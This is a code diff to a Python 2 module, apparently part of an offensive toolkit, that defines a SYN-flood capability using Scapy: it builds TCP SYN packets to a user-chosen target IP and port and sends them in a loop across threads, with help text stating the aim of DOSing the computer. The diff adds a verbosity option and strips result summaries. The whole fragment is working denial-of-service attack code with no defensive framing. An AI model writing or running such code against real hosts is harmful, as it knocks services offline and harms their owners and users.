@@ -11,6 +11,7 @@ class Syn(Capability):
                 "target" : Option("target", "", "IP of target to attack", True),
                 "inter"  : Option("inter", 0.3, "Interval between sending packets", True),
                 "threads": Option("threads", 3, "Number of threads", True),
+                "verbose": Option("verbose", 1, "Verbosity - 3 will show all packets", True),
                 }
         self.help_text = INFO + "Sends tons of packets to an IP in the hopes of DOSing the computer." 
 
@@ -20,12 +21,7 @@ class Syn(Capability):
 
     def flood(self):
         p = IP(dst=self.get_value("target"), id=1111, ttl=99)/TCP(sport=RandShort(), dport=int(self.get_value("port")), seq=12345, ack=1000, window=1000, flags="S")/"Payload"
-        ans, unans = srloop(p, inter=float(self.get_value("inter")), retry=2, timeout=4, verbose=1)
-        print "Summary of answered & unanswered packets"
-        ans.summary()
-        unans.summary()
-        print "source port flags in response"
-        ans.make_table(lambda(s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+        ans, unans = srloop(p, inter=float(self.get_value("inter")), retry=2, timeout=4, verbose=int(self.get_value("verbose")))
     
     def launch(self):
         self.threads = []
